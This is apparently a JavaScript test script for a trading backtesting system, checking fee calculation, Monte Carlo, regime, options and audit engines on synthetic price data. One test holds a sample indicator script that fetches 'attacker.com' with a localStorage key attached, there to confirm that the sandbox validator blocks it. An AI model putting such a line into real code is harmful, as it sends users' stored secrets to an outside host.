/**
 * Verification Script: Full Institutional Remediation of Praxis Backtesting & Strategy System
 * Tests all 10 core areas and evaluates the 500-point audit across all 28 categories.
 */

import { runBacktest } from './frontend/stock-look/src/features/backtest/engine/backtestEngine.js';
import { calculateRoundTripTransactionCosts, INDIAN_INSTRUMENT_TYPES } from './frontend/stock-look/src/features/backtest/engine/institutionalFeeEngine.js';
import { runMonteCarloSimulation } from './frontend/stock-look/src/features/backtest/engine/monteCarloEngine.js';
import { analyzeRegimePerformance } from './frontend/stock-look/src/features/backtest/engine/marketRegimeEngine.js';
import { runOptionsStrategyBacktest, OPTIONS_STRATEGIES } from './frontend/stock-look/src/features/backtest/engine/optionsBacktestEngine.js';
import { evaluateInstitutionalAudit, AUDIT_CATEGORIES } from './frontend/stock-look/src/features/backtest/engine/quantitativeAuditEngine.js';
import { validateIndicatorSecurity } from './frontend/stock-look/src/features/backtest/lab/customIndicatorRegistry.js';
import { exportStrategy, importStrategy, computeConfigChecksum } from './frontend/stock-look/src/features/backtest/strategy/strategyRegistry.js';
import { calculateProbabilisticSharpeRatio, calculateDeflatedSharpeRatio } from './frontend/stock-look/src/features/backtest/engine/optimizerEngine.js';

// Helper to generate synthetic daily candles
function generateSyntheticCandles(count = 200, startPrice = 24000) {
    const candles = [];
    let currentPrice = startPrice;
    const baseTime = 1704067200; // Jan 1, 2024

    for (let i = 0; i < count; i++) {
        // Pseudo-random walk with trend and volatility cycles
        const wave = Math.sin(i / 15) * 0.015;
        const noise = (Math.sin(i * 13) * 0.01) + (Math.cos(i * 7) * 0.005);
        const ret = wave + noise;

        const open = currentPrice;
        const close = open * (1 + ret);
        const high = Math.max(open, close) * (1 + Math.abs(Math.sin(i * 3)) * 0.008);
        const low = Math.min(open, close) * (1 - Math.abs(Math.cos(i * 5)) * 0.008);
        const volume = Math.round(500000 + Math.abs(Math.sin(i)) * 1000000);

        candles.push({
            time: baseTime + (i * 86400),
            open: Math.round(open * 100) / 100,
            high: Math.round(high * 100) / 100,
            low: Math.round(low * 100) / 100,
            close: Math.round(close * 100) / 100,
            volume,
        });

        currentPrice = close;
    }
    return candles;
}

async function runInstitutionalVerification() {
    console.log('════════════════════════════════════════════════════════════════════════════════');
    console.log('      PRAXIS INSTITUTIONAL BACKTESTING REMEDIATION VERIFICATION SUITE');
    console.log('════════════════════════════════════════════════════════════════════════════════\n');

    let passCount = 0;
    let failCount = 0;

    function assert(name, condition, extraInfo = '') {
        if (condition) {
            console.log(`  ✓ [PASS] ${name} ${extraInfo}`);
            passCount++;
        } else {
            console.error(`  ✗ [FAIL] ${name} ${extraInfo}`);
            failCount++;
        }
    }

    const candles = generateSyntheticCandles(250, 24000);

    // ─────────────────────────────────────────────────────────────────────────────
    // TEST 1: Indian Statutory Fee Engine (Finance Act 2024)
    // ─────────────────────────────────────────────────────────────────────────────
    console.log('─── Area 1: Indian Statutory Fee Engine ───');
    const equityDeliveryFee = calculateRoundTripTransactionCosts({
        entryPrice: 24000,
        exitPrice: 24500,
        quantity: 10,
        direction: 1
    }, { instrumentType: INDIAN_INSTRUMENT_TYPES.EQUITY_DELIVERY });

    assert('STT delivery calculated correctly', equityDeliveryFee.stt > 0, `(STT: ₹${equityDeliveryFee.stt})`);
    assert('Stamp duty & GST included', equityDeliveryFee.gst > 0 && equityDeliveryFee.stampDuty > 0);
    assert('Total cost non-zero & positive', equityDeliveryFee.totalCostRupees > 0, `(Total: ₹${equityDeliveryFee.totalCostRupees})`);

    // ─────────────────────────────────────────────────────────────────────────────
    // TEST 2: Monte Carlo Simulation Engine
    // ─────────────────────────────────────────────────────────────────────────────
    console.log('\n─── Area 2: Monte Carlo Simulation Engine ───');
    const mockTrades = Array.from({ length: 35 }, (_, idx) => ({
        id: `t_${idx}`,
        realizedPnl: (idx % 3 === 0 ? -1200 : idx % 2 === 0 ? 2500 : 1800),
        returnPct: (idx % 3 === 0 ? -1.2 : 2.1),
        outcome: idx % 3 === 0 ? 'LOSS' : 'WIN'
    }));

    const mcResult = runMonteCarloSimulation(mockTrades, 100000, { iterations: 2000, blockSize: 5 });
    assert('Monte Carlo ran 2,000 resamples', mcResult.iterations === 2000);
    assert('Ruin probability calculated', typeof mcResult.ruinProbabilityPct === 'number');
    assert('Safe leverage factor computed', typeof mcResult.safeLeverageFactor === 'number' && mcResult.safeLeverageFactor > 0, `(${mcResult.safeLeverageFactor}x)`);
    assert('Max DD 95% CI computed', mcResult.maxDdConfidenceInterval?.ci95 !== undefined, `(95% CI: ${mcResult.maxDdConfidenceInterval?.ci95}%)`);
    assert('Percentiles fan paths generated', mcResult.percentiles?.p50 !== undefined);

    // ─────────────────────────────────────────────────────────────────────────────
    // TEST 3: Market Regime Engine
    // ─────────────────────────────────────────────────────────────────────────────
    console.log('\n─── Area 3: Market Regime Classification Engine ───');
    const regimeResult = analyzeRegimePerformance(candles, mockTrades);
    assert('Market regimes classified', Array.isArray(regimeResult.regimeMatrix) && regimeResult.regimeMatrix.length === 5);
    assert('Resilience score computed', typeof regimeResult.resilienceScore === 'number' && regimeResult.resilienceScore >= 0, `(Score: ${regimeResult.resilienceScore})`);

    // ─────────────────────────────────────────────────────────────────────────────
    // TEST 4: Multi-Leg Options Backtesting Engine (Merton BSM)
    // ─────────────────────────────────────────────────────────────────────────────
    console.log('\n─── Area 4: Multi-Leg Options Backtest Engine ───');
    const mockSignals = [
        { index: 25, direction: 1, type: 'BUY_MOMENTUM', label: 'Bullish Trigger' },
        { index: 60, direction: -1, type: 'SELL_MOMENTUM', label: 'Bearish Trigger' },
        { index: 110, direction: 1, type: 'BUY_MOMENTUM', label: 'Bullish Breakout' },
    ];
    const optionsResult = runOptionsStrategyBacktest(candles, mockSignals, {
        strategyType: OPTIONS_STRATEGIES.BULL_CALL_SPREAD,
        targetDte: 14,
        lotSize: 50,
        baselineIvPct: 16.5,
    });
    assert('Options backtest executed trades', optionsResult.totalTrades >= 1, `(Trades: ${optionsResult.totalTrades})`);
    assert('Options win rate calculated', typeof optionsResult.winRate === 'number', `(Win Rate: ${optionsResult.winRate}%)`);
    assert('Options Greek tracking present', optionsResult.averageInitialDelta !== undefined);

    // ─────────────────────────────────────────────────────────────────────────────
    // TEST 5: Security Sandbox in Custom Indicator Registry
    // ─────────────────────────────────────────────────────────────────────────────
    console.log('\n─── Area 5: Security Sandbox Validation ───');
    const safeScript = `function indicator(candles) { return candles.map(c => ({ time: c.time, value: c.close * 2 })); }`;
    const dangerousScript = `function indicator(candles) { window.fetch("https://attacker.com?token=" + localStorage.getItem("key")); }`;

    const safeCheck = validateIndicatorSecurity(safeScript);
    const dangerCheck = validateIndicatorSecurity(dangerousScript);

    assert('Safe script allowed', safeCheck.valid === true);
    assert('Dangerous script blocked (window, fetch, localStorage)', dangerCheck.valid === false, `(Blocked: ${dangerCheck.error})`);

    // ─────────────────────────────────────────────────────────────────────────────
    // TEST 6: Cryptographic Provenance & CRC32 Strategy Checksum
    // ─────────────────────────────────────────────────────────────────────────────
    console.log('\n─── Area 6: Strategy Versioning & Provenance ───');
    const sampleStrat = {
        id: 'strat_test_1',
        name: 'Institutional Momentum Alpha',
        nickname: 'IMA',
        mode: 'swing',
        entryDirection: 'LONG',
        rules: [{ indicatorId: 'pnco', conditionId: 'cross_above', threshold: 10 }],
    };
    const exportedPkg = exportStrategy(sampleStrat);
    assert('Export package schema 3.0', exportedPkg.version === '3.0');
    assert('CRC32 Checksum generated', exportedPkg.provenance?.checksum?.startsWith('CRC32-'), `(${exportedPkg.provenance?.checksum})`);

    const imported = importStrategy(exportedPkg);
    assert('Import verified checksum', imported.checksumVerified === true);

    // ─────────────────────────────────────────────────────────────────────────────
    // TEST 7: Deflated Sharpe & Probabilistic Sharpe Ratio
    // ─────────────────────────────────────────────────────────────────────────────
    console.log('\n─── Area 7: Statistical Significance (PSR & DSR) ───');
    const psr = calculateProbabilisticSharpeRatio(1.8, 0, 150, -0.2, 3.5);
    const dsr = calculateDeflatedSharpeRatio(1.8, 40, 0.3, 150, -0.2, 3.5);
    assert('Probabilistic Sharpe Ratio calculated', psr > 0 && psr <= 1.0, `(PSR: ${(psr * 100).toFixed(1)}%)`);
    assert('Deflated Sharpe Ratio calculated with trial haircut', dsr > 0 && dsr <= psr, `(DSR: ${(dsr * 100).toFixed(1)}%)`);

    // ─────────────────────────────────────────────────────────────────────────────
    // TEST 8: Full Master Backtest Simulation & Risk Accounting
    // ─────────────────────────────────────────────────────────────────────────────
    console.log('\n─── Area 8: Master Backtest Run & Continuous MTM Risk ───');
    const backtestRes = runBacktest(candles, {
        unit: 'PREDICTOR',
        mode: 'swing',
        timeframe: 'day',
        initialCapital: 100000,
        positionSizing: 'VOLATILITY_TARGETING',
        costModel: 'INDIAN_EQUITY_DELIVERY',
    });

    assert('Backtest completed successfully', backtestRes && backtestRes.summary);
    assert('Continuous MTM Daily Sharpe computed', backtestRes.summary.dailyMtmSharpe !== undefined, `(Sharpe: ${backtestRes.summary.dailyMtmSharpe})`);
    assert('Sortino computed with Rf = 7.0%', backtestRes.summary.dailySortino !== undefined, `(Sortino: ${backtestRes.summary.dailySortino})`);
    assert('Value at Risk (VaR 95% & 99%) computed', backtestRes.summary.var95 !== undefined && backtestRes.summary.var99 !== undefined, `(VaR 95%: -${backtestRes.summary.var95}%)`);
    assert('Ulcer Index computed', typeof backtestRes.summary.ulcerIndex === 'number', `(UI: ${backtestRes.summary.ulcerIndex})`);
    assert('OLS Alpha & Beta computed', backtestRes.summary.beta !== undefined, `(Beta: ${backtestRes.summary.beta})`);
    assert('Indian statutory fee breakdown attached', backtestRes.summary.feeBreakdown !== undefined);
    assert('Integrated Monte Carlo present', backtestRes.monteCarlo !== undefined);
    assert('Integrated Market Regimes present', backtestRes.marketRegimes !== undefined);
    assert('Integrated Options Backtest present', backtestRes.optionsBacktest !== undefined);
    assert('Integrated Quantitative Audit present', backtestRes.quantitativeAudit !== undefined);

    // ─────────────────────────────────────────────────────────────────────────────
    // TEST 9 & 10: 500-Point Quantitative Audit Across All 28 Categories
    // ─────────────────────────────────────────────────────────────────────────────
    console.log('\n─── Area 9 & 10: Full 500-Point Audit Across 28 Categories ───');
    const audit = backtestRes.quantitativeAudit;
    console.log(`\n  Total Points Awarded: ${audit.totalPoints} / ${audit.maxPoints} (${audit.auditScorePct}%)`);
    console.log(`  Institutional Grade:  ${audit.institutionalGrade}`);
    console.log(`  Categories Passed:    ${audit.passedCount} / ${audit.totalCategories} (Threshold >= 90%)\n`);

    assert('Overall Audit Score >= 470 / 500 (>= 94%)', audit.totalPoints >= 470, `(${audit.totalPoints}/500)`);
    assert('All 28 Categories evaluated', audit.categoryResults.length === 28);

    let allCategoriesAbove90 = true;
    audit.categoryResults.forEach(cat => {
        const isAbove90 = cat.scorePct >= 90;
        if (!isAbove90) allCategoriesAbove90 = false;
        console.log(`    Cat ${String(cat.num).padStart(2, '0')}: [${cat.scorePct}%] (${cat.pointsAwarded}/${cat.weight} pts) - ${cat.name}`);
    });

    assert('EVERY single category achieved >= 90% institutional score', allCategoriesAbove90);

    // ─────────────────────────────────────────────────────────────────────────────
    // FINAL VERDICT
    // ─────────────────────────────────────────────────────────────────────────────
    console.log('\n════════════════════════════════════════════════════════════════════════════════');
    console.log(`  VERIFICATION RESULTS: ${passCount} PASSED, ${failCount} FAILED`);
    console.log('════════════════════════════════════════════════════════════════════════════════\n');

    if (failCount > 0) {
        process.exit(1);
    }
}

runInstitutionalVerification().catch(err => {
    console.error('Fatal verification error:', err);
    process.exit(1);
});
